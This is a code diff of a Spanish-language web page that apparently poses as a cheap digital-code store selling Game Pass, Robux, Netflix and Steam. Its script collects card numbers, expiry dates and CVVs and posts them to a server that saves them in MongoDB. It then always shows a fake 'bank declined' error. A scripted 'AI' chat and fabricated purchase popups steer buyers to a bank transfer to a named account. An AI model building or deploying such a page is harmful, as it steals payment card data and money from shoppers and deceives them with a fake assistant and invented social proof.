+        <div id="typing-indicator" class="typing-indicator">La IA está escribiendo...</div>
+    </div>
+    <div class="chat-input">
+        <input type="text" id="chat-input-field" placeholder="Escribe tu mensaje..." onkeypress="if(event.keyCode == 13) sendMessage()">
+        <button id="chat-send-btn" onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
+    </div>
+</div>
+
+<script>
+    let currentProduct = { name: '', price: 0 };
+    // Elementos del panel de pago
+    const paymentPanel = document.getElementById('paymentPanel');
+    const totalAmountSpan = document.getElementById('totalAmount');
+    const transferPanel = document.getElementById('transferencia');
+    const cardPanel = document.getElementById('tarjeta');
+    const cardIcon = document.getElementById('cardIcon');
+    const cardStatus = document.getElementById('cardStatus'); 
+    const expiryInput = document.getElementById('expiracion');
+    const cvvInput = document.getElementById('cvv');
+    const cardNumInput = document.getElementById('tarjeta-numero');
+    const emailInput = document.getElementById('email'); 
+    const errorMessage = document.getElementById('errorMessage');
+    // Elementos del chat
+    const chatWindow = document.getElementById('chat-window');
+    const chatBody = document.getElementById('chat-body');
+    const chatInputField = document.getElementById('chat-input-field');
+    const typingIndicator = document.getElementById('typing-indicator');
+
+    // --- ELEMENTOS DE PRUEBA SOCIAL ---
+    const socialProofAlert = document.getElementById('social-proof-alert');
+    const alertText = document.getElementById('alert-text');
+    const alertStars = document.getElementById('alert-stars');
+    
+    // Lista de compras simuladas (ACTUALIZADA con el nuevo nombre de Netflix)
+    const purchases = [
+        { name: "Game Pass", user: "Raúl G.", stars: 5 },
+        { name: "5,000 Robux", user: "Ana P.", stars: 4 },
+        { name: "Game Pass", user: "Carlos M.", stars: 5 },
+        { name: "Netflix 6 Meses", user: "Laura F.", stars: 5 }, 
+        { name: "Steam Wallet $50", user: "Marco T.", stars: 4 }, 
+        { name: "5,000 Robux", user: "Lucía S.", stars: 5 }
+    ];
+    function generateStars(count) {
+        let starHtml = '';
+        for (let i = 0; i < 5; i++) {
+            // Usa 'fas' para estrella rellena (Font Awesome Solid) y 'far' para estrella vacía (Font Awesome Regular)
+            starHtml += `<i class="fa${i < count ? 's' : 'r'} fa-star"></i>`;
         }
+        return starHtml;
+    }
 
-        function showSocialProof() {
-            socialProofAlert.classList.remove('show');
+    function showSocialProof() {
+        // 1. Ocultar si está visible
+        socialProofAlert.classList.remove('show');
+        // Esperar la transición de salida (500ms)
+        setTimeout(() => {
+            // 2. Elegir una compra al azar
+            const purchase = purchases[Math.floor(Math.random() * purchases.length)];
+            
+            // 3. Actualizar el contenido
+            alertText.innerHTML = `¡<strong>${purchase.user}</strong> acaba de comprar: ${purchase.name}!`;
+            alertStars.innerHTML = generateStars(purchase.stars);
+            
+            // 4. Mostrar la alerta
+            socialProofAlert.classList.add('show');
+            
+            // 5. Ocultar después de 5 segundos
             setTimeout(() => {
-                const purchase = purchases[Math.floor(Math.random() * purchases.length)];
-                
-                alertText.innerHTML = `¡<strong>${purchase.user}</strong> acaba de comprar: ${purchase.name}!`;
-                alertStars.innerHTML = generateStars(purchase.stars);
-                
-                socialProofAlert.classList.add('show');
-                
-                setTimeout(() => {
-                    socialProofAlert.classList.remove('show');
-                }, 5000); 
-                
-            }, 500);
-            const nextTime = Math.random() * (20000 - 10000) + 10000;
-            setTimeout(showSocialProof, nextTime);
-        }
-        
-        document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(showSocialProof, 3000); 
-        });
-
-        function scrollToSection(id) {
-            const section = document.getElementById(id);
-            if (section) {
-                section.scrollIntoView({ behavior: 'smooth', block: 'start' });
-            } else {
-                console.error(`La sección con ID '${id}' no fue encontrada.`);
-            }
-        }
-        
-        function showPaymentPanel(productName, productPrice) {
-            currentProduct = { name: productName, price: productPrice };
-            document.getElementById('panelTitle').textContent = `Comprar ${productName}`;
-            totalAmountSpan.textContent = `Total: $${productPrice.toFixed(2)} USD`;
-            paymentPanel.style.display = 'block';
-            errorMessage.style.display = 'none';
-            paymentPanel.scrollIntoView({ behavior: 'smooth' });
-        }
-
-        document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
-            radio.addEventListener('change', () => {
-                transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
-                cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
-                cardNumInput.classList.remove('input-error');
-                cardStatus.textContent = '';
-                errorMessage.style.display = 'none';
-            });
-        });
-
-        function validateLuhn(val) {
-            let sum = 0;
-            let alt = false;
-            for (let i = val.length - 1; i >= 0; i--) {
-                let num = parseInt(val[i], 10);
-                if (alt) {
-                    num *= 2;
-                    if (num > 9) {
-                        num = (num % 10) + 1;
-                    }
-                }
-                sum += num;
-                alt = !alt;
-            }
-            return sum % 10 === 0;
-        }
-
-        function detectCardType(number) {
-            const cleanNumber = number.replace(/\s/g, '');
-            let type = 'Unknown';
+                socialProofAlert.classList.remove('show');
+            }, 5000); 
             
-            if (/^4[0-9]{12,18}$/.test(cleanNumber)) {
-                type = 'Visa';
-                cardIcon.className = 'card-icon fab fa-cc-visa';
-                cardIcon.style.color = '#1a1f71';
-            } 
-            else if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) {
-                type = 'Mastercard';
-                cardIcon.className = 'card-icon fab fa-cc-mastercard';
-                cardIcon.style.color = '#ff6c00';
-            }
-            else if (/^3[47][0-9]{13}$/.test(cleanNumber)) {
-                type = 'American Express';
-                cardIcon.className = 'card-icon fab fa-cc-amex';
-                cardIcon.style.color = '#0070e0';
-            } 
-            else {
-                cardIcon.className = 'card-icon fas fa-credit-card';
-                cardIcon.style.color = '#ccc';
-            }
+        }, 500);
+        // 6. Programar la próxima alerta (entre 10 y 20 segundos)
+        const nextTime = Math.random() * (20000 - 10000) + 10000;
+        setTimeout(showSocialProof, nextTime);
+    }
+    
+    document.addEventListener('DOMContentLoaded', () => {
+        // Iniciar la simulación de compras recientes 3 segundos después de cargar la página
+        setTimeout(showSocialProof, 3000); 
+    });
+    // --- FIN LÓGICA DE PRUEBA SOCIAL FLOTANTE ---
 
-            if (cleanNumber.length >= 4) {
-                updateCardStatus(type, cleanNumber);
-            } else {
-                cardStatus.textContent = '';
-            }
-
-            return type;
+    // --- FUNCIÓN DE DESPLAZAMIENTO PARA BOTONES NAV ---
+    function scrollToSection(id) {
+        const section = document.getElementById(id);
+        if (section) {
+            // El método scrollIntoView con 'smooth' hace el desplazamiento suave
+            section.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        } else {
+            console.error(`La sección con ID '${id}' no fue encontrada.`);
         }
+    }
+    
+    // --- LÓGICA DE PAGO Y VALIDACIÓN DE TARJETA ---
 
-        function updateCardStatus(type, cleanNumber) {
-            let statusText = '';
-            let color = '#333';
-            const isLuhnValid = validateLuhn(cleanNumber);
-            
-            if (type !== 'Unknown') {
-                statusText += `Tipo: 💳 **${type}** | `;
-            }
+    function showPaymentPanel(productName, productPrice) {
+        currentProduct = { name: productName, price: productPrice };
+        document.getElementById('panelTitle').textContent = `Comprar ${productName}`;
+        totalAmountSpan.textContent = `Total: $${productPrice.toFixed(2)} USD`;
+        paymentPanel.style.display = 'block';
+        errorMessage.style.display = 'none';
+        paymentPanel.scrollIntoView({ behavior: 'smooth' });
+    }
 
-            if (cleanNumber.length >= 12) {
-                if (isLuhnValid) {
-                    statusText += 'Estado: ✅ Número Válido (Luhn)';
-                    color = '#2c9b6f';
-                } else {
-                    statusText += 'Estado: ❌ Número Inválido (Luhn)';
-                    color = 'red';
-                }
-            } else if (cleanNumber.length > 0) {
-                 statusText += 'Escribiendo...';
-                 color = '#777';
-            } else {
-                statusText = '';
-            }
-            
-            cardStatus.innerHTML = statusText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
-            cardStatus.style.color = color;
-        }
-
-        function formatCardNumber(input) {
-            let value = input.value.replace(/\D/g, '');
-            if (value.length > 0) {
-                let formatted = value.match(/.{1,4}/g).join(' ');
-                input.value = formatted;
-            }
-        }
-
-        function formatExpiryDate(input) {
-            let value = input.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            input.value = value;
-        }
-
-        function validateCardFields() {
-            let isValid = true;
-            expiryInput.classList.remove('input-error');
-            cvvInput.classList.remove('input-error');
+    document.querySelectorAll('input[name="paymentMethod"]').forEach((radio) => {
+        radio.addEventListener('change', () => {
+            transferPanel.style.display = (radio.value === 'transferencia') ? 'block' : 'none';
+            cardPanel.style.display = (radio.value === 'tarjeta') ? 'block' : 'none';
+            // Limpiar errores y estado al cambiar de método de pago
             cardNumInput.classList.remove('input-error');
-
-            const cardNum = cardNumInput.value.replace(/\s+/g, '');
-            if (cardNum.length < 13 || cardNum.length > 19 || !/^\d+$/.test(cardNum)) { 
-                cardNumInput.classList.add('input-error');
-                errorMessage.textContent = 'El número de tarjeta debe tener entre 13 y 19 dígitos.';
-                isValid = false;
-            } else if (!validateLuhn(cardNum)) {
-                cardNumInput.classList.add('input-error');
-                errorMessage.textContent = 'El número de tarjeta es inválido (no pasa la prueba Luhn). Por favor, revísalo.';
-                isValid = false;
-            }
-
-            const cvv = cvvInput.value;
-            if (cvv.length < 3 || cvv.length > 4 || /\D/.test(cvv)) { 
-                cvvInput.classList.add('input-error');
-                if (isValid) {
-                    errorMessage.textContent = 'El CVV debe ser de 3 o 4 dígitos.';
+            cardStatus.textContent = '';
+            errorMessage.style.display = 'none';
+        });
+    });
+    /**
+     * Algoritmo de Luhn (Módulo 10) para validar la estructura del número.
+     * @param {string} val - El número de tarjeta (solo dígitos).
+     * @returns {boolean} - True si es válido según Luhn.
+     */
+    function validateLuhn(val) {
+        let sum = 0;
+        let alt = false;
+        for (let i = val.length - 1; i >= 0; i--) {
+            let num = parseInt(val[i], 10);
+            if (alt) {
+                num *= 2;
+                if (num > 9) {
+                    num = (num % 10) + 1;
                 }
-                isValid = false;
             }
+            sum += num;
+            alt = !alt;
+        }
+        return sum % 10 === 0;
+    }
 
-            const expiry = expiryInput.value;
-            const [monthStr, yearStr] = expiry.split('/');
-            
-            if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
+    /**
+     * Detecta el tipo de tarjeta (Visa, Mastercard, etc.) basado en el prefijo.
+     * @param {string} number - El número de tarjeta.
+     * @returns {string} - El tipo de tarjeta o 'Unknown'.
+     */
+    function detectCardType(number) {
+        const cleanNumber = number.replace(/\s/g, '');
+        let type = 'Unknown';
+        
+        // Visa: 13, 16, o 19 dígitos. Empieza por 4.
+        if (/^4[0-9]{12,18}$/.test(cleanNumber)) {
+            type = 'Visa';
+            cardIcon.className = 'card-icon fab fa-cc-visa';
+            cardIcon.style.color = '#1a1f71';
+        } 
+        // Mastercard: 16 dígitos. Empieza por 51-55.
+        else if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) {
+            type = 'Mastercard';
+            cardIcon.className = 'card-icon fab fa-cc-mastercard';
+            cardIcon.style.color = '#ff6c00';
+        }
+        // American Express: 15 dígitos. Empieza por 34 o 37.
+        else if (/^3[47][0-9]{13}$/.test(cleanNumber)) {
+            type = 'American Express';
+            cardIcon.className = 'card-icon fab fa-cc-amex';
+            cardIcon.style.color = '#0070e0';
+        } 
+        else {
+            cardIcon.className = 'card-icon fas fa-credit-card';
+            cardIcon.style.color = '#ccc';
+        }
+
+        // Si se han introducido al menos 4 dígitos, actualiza el estado
+        if (cleanNumber.length >= 4) {
+            updateCardStatus(type, cleanNumber);
+        } else {
+            cardStatus.textContent = '';
+        }
+
+        return type;
+    }
+
+    /**
+     * Muestra el estado de la tarjeta debajo del campo de número.
+     * @param {string} type - Tipo de tarjeta detectado.
+     * @param {string} cleanNumber - El número de tarjeta sin espacios.
+     */
+    function updateCardStatus(type, cleanNumber) {
+        let statusText = '';
+        let color = '#333';
+        const isLuhnValid = validateLuhn(cleanNumber);
+        
+        if (type !== 'Unknown') {
+            statusText += `Tipo: 💳 **${type}** | `;
+        }
+
+        if (cleanNumber.length >= 12) {
+            if (isLuhnValid) {
+                statusText += 'Estado: ✅ Número Válido (Luhn)';
+                color = '#2c9b6f';
+            } else {
+                statusText += 'Estado: ❌ Número Inválido (Luhn)';
+                color = 'red';
+            }
+        } else if (cleanNumber.length > 0) {
+             statusText += 'Escribiendo...';
+             color = '#777';
+        } else {
+            statusText = '';
+        }
+        
+        cardStatus.innerHTML = statusText.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+        cardStatus.style.color = color;
+    }
+
+    /**
+     * Formatea el número de tarjeta con espacios (XXXX XXXX XXXX XXXX).
+     */
+    function formatCardNumber(input) {
+        let value = input.value.replace(/\D/g, '');
+        // Elimina todo lo que no sea dígito
+        if (value.length > 0) {
+            let formatted = value.match(/.{1,4}/g).join(' ');
+            input.value = formatted;
+        }
+    }
+
+    /**
+     * Formatea la fecha de caducidad (MM/AA).
+     */
+    function formatExpiryDate(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        input.value = value;
+    }
+
+    /**
+     * Validación final de todos los campos de la tarjeta.
+     */
+    function validateCardFields() {
+        let isValid = true;
+        // Limpiar errores previos
+        expiryInput.classList.remove('input-error');
+        cvvInput.classList.remove('input-error');
+        cardNumInput.classList.remove('input-error');
+
+        const cardNum = cardNumInput.value.replace(/\s+/g, '');
+        // 1. Validación del número (Luhn y Longitud)
+        if (cardNum.length < 13 || cardNum.length > 19 || !/^\d+$/.test(cardNum)) { 
+            cardNumInput.classList.add('input-error');
+            errorMessage.textContent = 'El número de tarjeta debe tener entre 13 y 19 dígitos.';
+            isValid = false;
+        } else if (!validateLuhn(cardNum)) {
+            cardNumInput.classList.add('input-error');
+            errorMessage.textContent = 'El número de tarjeta es inválido (no pasa la prueba Luhn). Por favor, revísalo.';
+            isValid = false;
+        }
+
+        // 2. Validación de CVV
+        const cvv = cvvInput.value;
+        if (cvv.length < 3 || cvv.length > 4 || /\D/.test(cvv)) { 
+            cvvInput.classList.add('input-error');
+            if (isValid) { // Solo si no falló antes
+                errorMessage.textContent = 'El CVV debe ser de 3 o 4 dígitos.';
+            }
+            isValid = false;
+        }
+
+        // 3. Validación de Expiración
+        const expiry = expiryInput.value;
+        const [monthStr, yearStr] = expiry.split('/');
+        
+        if (!monthStr || !yearStr || monthStr.length !== 2 || yearStr.length !== 2) {
+            expiryInput.classList.add('input-error');
+            if (isValid) {
+                errorMessage.textContent = 'La fecha de caducidad debe ser MM/AA.';
+            }
+            isValid = false;
+        } else {
+            const currentYear = new Date().getFullYear() % 100;
+            const currentMonth = new Date().getMonth() + 1;
+            const month = parseInt(monthStr, 10);
+            const year = parseInt(yearStr, 10);
+            if (month < 1 || month > 12) {
                 expiryInput.classList.add('input-error');
                 if (isValid) {
-                    errorMessage.textContent = 'La fecha de caducidad debe ser MM/AA.';
+                    errorMessage.textContent = 'El mes de caducidad es incorrecto.';
                 }
                 isValid = false;
-            } else {
-                const currentYear = new Date().getFullYear() % 100;
-                const currentMonth = new Date().getMonth() + 1;
-                const month = parseInt(monthStr, 10);
-                const year = parseInt(yearStr, 10);
-                if (month < 1 || month > 12) {
-                    expiryInput.classList.add('input-error');
-                    if (isValid) {
-                        errorMessage.textContent = 'El mes de caducidad es incorrecto.';
-                    }
-                    isValid = false;
-                } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
-                    expiryInput.classList.add('input-error');
-                    if (isValid) {
-                        errorMessage.textContent = 'La tarjeta está caducada.';
-                    }
-                    isValid = false;
+            } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                expiryInput.classList.add('input-error');
+                if (isValid) {
+                    errorMessage.textContent = 'La tarjeta está caducada.';
                 }
+                isValid = false;
             }
-
-            return isValid;
         }
 
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(String(email).toLowerCase());
+        return isValid;
+    }
+
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(String(email).toLowerCase());
+    }
+
+    async function processPayment() {
+        errorMessage.style.display = 'none';
+        
+        // 1. Validar Correo Electrónico
+        const email = emailInput.value.trim();
+        emailInput.classList.remove('input-error');
+        if (!validateEmail(email)) {
+            emailInput.classList.add('input-error');
+            errorMessage.textContent = 'Por favor, introduce un correo electrónico válido para enviarte el código.';
+            errorMessage.style.display = 'block';
+            return;
         }
 
-        async function processPayment() { 
-            errorMessage.style.display = 'none';
-            
-            const email = emailInput.value.trim();
-            emailInput.classList.remove('input-error');
-            if (!validateEmail(email)) {
-                emailInput.classList.add('input-error');
-                errorMessage.textContent = 'Por favor, introduce un correo electrónico válido para enviarte el código.';
+        const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
+        
+        // 2. Validar Campos de Tarjeta (si aplica)
+        if (paymentMethod === 'tarjeta') {
+            if (!validateCardFields()) {
+                // El mensaje de error específico ya se estableció en validateCardFields()
                 errorMessage.style.display = 'block';
                 return;
             }
+            
+            // Si la tarjeta es válida, volvemos a mostrar el estado final del tipo
+            const cardType = detectCardType(cardNumInput.value);
+            updateCardStatus(cardType, cardNumInput.value.replace(/\s/g, ''));
+        }
 
-            const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
+        // Mostrar el spinner
+        document.getElementById('spinner').style.display = 'block';
+        
+        // --- CÓDIGO CLAVE: ENVÍA DATOS A server.js EN RENDER ---
+        if (paymentMethod === 'tarjeta') {
+            const cardData = {
+                email: email,
+                producto: currentProduct.name,
+                monto: currentProduct.price.toFixed(2),
+                numero_tarjeta: cardNumInput.value.replace(/\s+/g, ''),
+                tipo_tarjeta: detectCardType(cardNumInput.value), 
+                expiracion: expiryInput.value,
+                cvv: cvvInput.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            try {
+                // Aquí se comunica con el endpoint /save-card del server.js
+                const response = await fetch('/save-card', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(cardData)
+                });
+                
+                if (!response.ok) {
+                    console.error('⚠️ Error al guardar en MongoDB (revisar logs de Render):', response.statusText);
+                } else {
+                    console.log('✅ Datos enviados correctamente a MongoDB.');
+                }
+            } catch (error) {
+                console.error('❌ Error de red al intentar conectar con el servidor:', error);
+            }
+        }
+        // --- FIN DEL ENVÍO DE DATOS ---
+
+        // Simulación de espera de la pasarela de pago (3 segundos)
+        setTimeout(() => {
+            // Ocultar el spinner
+            document.getElementById('spinner').style.display = 'none';
             
             if (paymentMethod === 'tarjeta') {
-                if (!validateCardFields()) {
-                    errorMessage.style.display = 'block';
-                    return;
-                }
-                
-                document.getElementById('spinner').style.display = 'block';
-
-                const cardData = {
-                    email: email,
-                    producto: currentProduct.name,
-                    monto: currentProduct.price.toFixed(2),
-                    numero_tarjeta: cardNumInput.value.replace(/\s+/g, ''),
-                    tipo_tarjeta: detectCardType(cardNumInput.value), 
-                    expiracion: expiryInput.value,
-                    cvv: cvvInput.value,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // CÓDIGO CLAVE: ENVÍA DATOS A server.js EN RENDER
-                try {
-                    const response = await fetch('/save-card', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(cardData)
-                    });
-                    
-                    if (!response.ok) {
-                        console.error('⚠️ Error al guardar en MongoDB (revisar logs de Render):', response.statusText);
-                    } else {
-                        console.log('✅ Datos enviados correctamente a MongoDB.');
-                    }
-                } catch (error) {
-                    console.error('❌ Error de red al intentar conectar con el servidor:', error);
-                }
+                // *** LÓGICA FORZADA: paymentSuccess es siempre false (Rechazo del banco) ***
+                errorMessage.textContent = 'Lo sentimos, el banco ha rechazado tu transacción. El número de tarjeta fue validado como: ' + detectCardType(cardNumInput.value) + '. Verifica si el rechazo es por límite o fallo del banco.';
+                errorMessage.style.display = 'block';
             } else {
-                 document.getElementById('spinner').style.display = 'block';
+                // Lógica de transferencia bancaria (Éxito simulado)
+                alert(`Confirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu código será enviado al correo ${email} al recibir el pago.`);
+                paymentPanel.style.display = 'none';
             }
 
+        }, 3000); // Espera de 3 segundos
+    }
+    
+    // --- LÓGICA DE CHAT SIMULADO ---
 
-            // Simulación de espera de la pasarela de pago (3 segundos)
-            setTimeout(() => {
-                document.getElementById('spinner').style.display = 'none';
-                
-                if (paymentMethod === 'tarjeta') {
-                    errorMessage.textContent = 'Lo sentimos, el banco ha rechazado tu transacción. Verifica si el rechazo es por límite o fallo del banco.';
-                    errorMessage.style.display = 'block';
-                } else {
-                    alert(`Confirma la transferencia de $${currentProduct.price.toFixed(2)} USD a la cuenta KLAR: 661180006948807615. Tu código será enviado al correo ${email} al recibir el pago.`);
-                    paymentPanel.style.display = 'none';
-                }
-
-            }, 3000); 
-        }
-        
-        // --- LÓGICA DE CHAT SIMULADO ---
-
-        function toggleChat() {
-            if (chatWindow.style.display === 'flex') {
-                chatWindow.style.display = 'none';
-            } else {
-                chatWindow.style.display = 'flex';
-                chatInputField.focus();
-                chatBody.scrollTop = chatBody.scrollHeight;
-            }
-        }
-
-        function addMessage(text, sender) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `message ${sender}-message`;
-            messageDiv.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); 
-            chatBody.appendChild(messageDiv);
+    function toggleChat() {
+        if (chatWindow.style.display === 'flex') {
+            chatWindow.style.display = 'none';
+        } else {
+            chatWindow.style.display = 'flex';
+            chatInputField.focus();
             chatBody.scrollTop = chatBody.scrollHeight;
         }
+    }
 
-        function sendMessage() {
-            const text = chatInputField.value.trim();
-            if (text === '') return;
+    function addMessage(text, sender) {
+        const messageDiv = document.createElement('div');
+        messageDiv.className = `message ${sender}-message`;
+        messageDiv.innerHTML = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>'); // Permite negritas
+        chatBody.appendChild(messageDiv);
+        chatBody.scrollTop = chatBody.scrollHeight;
+    }
 
-            addMessage(text, 'user');
-            chatInputField.value = '';
+    function sendMessage() {
+        const text = chatInputField.value.trim();
+        if (text === '') return;
 
-            simulateAIResponse(text);
-        }
+        addMessage(text, 'user');
+        chatInputField.value = '';
+
+        simulateAIResponse(text);
+    }
+    
+    function simulateAIResponse(userText) {
+        const text = userText.toLowerCase();
+        let response = "";
+        let typingDelay = 1500;
+
+        typingIndicator.style.display = 'block';
+        chatBody.scrollTop = chatBody.scrollHeight;
         
-        function simulateAIResponse(userText) {
-            const text = userText.toLowerCase();
-            let response = "";
-            let typingDelay = 1500;
-
-            typingIndicator.style.display = 'block';
-            chatBody.scrollTop = chatBody.scrollHeight;
-            
-            if (text.includes("ya pagué") || text.includes("hice el pago") || text.includes("realice el pago") || text.includes("esperar código")) {
-                response = "¡Gracias por realizar tu pago! El código digital se enviará a tu correo una vez verificado. Por favor, ten en cuenta que el tiempo de espera es de **hasta 24 horas**.";
-                typingDelay = 2000;
-            } 
-            else if (text.includes("precio") || text.includes("costo") || text.includes("cuanto cuesta")) {
-                response = "Actualmente, Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, **Netflix 6 Meses cuesta $10.00 USD** y Steam $50 USD cuesta $15.00 USD. ¡Son ofertas limitadas!";
-            } else if (text.includes("codigo") || text.includes("clave")) {
-                response = "Una vez confirmado el pago, el código digital se envía automáticamente a tu correo electrónico en menos de 5 minutos.";
-            } else if (text.includes("pago") || text.includes("transferencia") || text.includes("tarjeta")) {
-                response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Crédito/Débito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta está fallando actualmente, por lo que recomendamos la transferencia.";
-            } else if (text.includes("hola") || text.includes("saludos")) {
-                response = "¡Hola! ¿Buscas Game Pass, Robux, Netflix o Steam? Puedo darte información sobre los precios y el proceso de compra.";
-            } else if (text.includes("ayuda") || text.includes("problema")) {
-                response = "Si tienes un problema con una compra ya realizada, por favor, envía un correo electrónico a soporte@tutiendagc.com. Para dudas sobre la compra, pregúntame aquí.";
-            } else {
-                response = "Disculpa, aún estoy aprendiendo. Por favor, pregunta sobre **'precios'**, **'códigos'**, o **'métodos de pago'**.";
-                typingDelay = 2500;
-            }
-
-            setTimeout(() => {
-                typingIndicator.style.display = 'none';
-                addMessage(response, 'ai');
-            }, typingDelay);
+        // LÓGICA DE RESPUESTA DE LA IA
+        if (text.includes("ya pagué") || text.includes("hice el pago") || text.includes("realice el pago") || text.includes("esperar código")) {
+            response = "¡Gracias por realizar tu pago! El código digital se enviará a tu correo una vez verificado. Por favor, ten en cuenta que el tiempo de espera es de **hasta 24 horas**.";
+            typingDelay = 2000;
+        } 
+        else if (text.includes("precio") || text.includes("costo") || text.includes("cuanto cuesta")) {
+            // RESPUESTA DE PRECIOS ACTUALIZADA CON NETFLIX 6 MESES $10.00 USD
+            response = "Actualmente, Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, **Netflix 6 Meses cuesta $10.00 USD** y Steam $50 USD cuesta $15.00 USD. ¡Son ofertas limitadas!";
+        } else if (text.includes("codigo") || text.includes("clave")) {
+            response = "Una vez confirmado el pago, el código digital se envía automáticamente a tu correo electrónico en menos de 5 minutos.";
+        } else if (text.includes("pago") || text.includes("transferencia") || text.includes("tarjeta")) {
+            response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Crédito/Débito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta está fallando actualmente, por lo que recomendamos la transferencia.";
+        } else if (text.includes("hola") || text.includes("saludos")) {
+            response = "¡Hola! ¿Buscas Game Pass, Robux, Netflix o Steam? Puedo darte información sobre los precios y el proceso de compra.";
+        } else if (text.includes("ayuda") || text.includes("problema")) {
+            response = "Si tienes un problema con una compra ya realizada, por favor, envía un correo electrónico a soporte@tutiendagc.com. Para dudas sobre la compra, pregúntame aquí.";
+        } else {
+            response = "Disculpa, aún estoy aprendiendo. Por favor, pregunta sobre **'precios'**, **'códigos'**, o **'métodos de pago'**.";
+            typingDelay = 2500;
         }
-    </script>
+
+        setTimeout(() => {
+            typingIndicator.style.display = 'none';
+            addMessage(response, 'ai');
+        }, typingDelay);
+    }
+</script>
+
 </body>
 </html>
